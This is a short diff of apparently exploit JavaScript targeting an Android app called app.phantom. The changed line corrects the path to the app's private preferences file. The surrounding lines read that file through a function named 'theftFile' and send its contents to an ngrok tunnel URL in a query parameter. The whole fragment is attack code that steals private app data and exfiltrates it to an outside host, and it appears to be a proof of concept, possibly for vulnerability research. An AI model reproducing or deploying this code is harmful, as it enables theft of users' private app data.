@@ -38,7 +38,7 @@
           req.send();
         }
 
-        var file = "/data/data/app.phantom/files/shared_prefs/app.phantom_preferences.xml";
+        var file = "/data/user/0/app.phantom/files/shared_prefs/app.phantom_preferences.xml";
         theftFile(file, function(contents) {
             location.href = "https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
         });
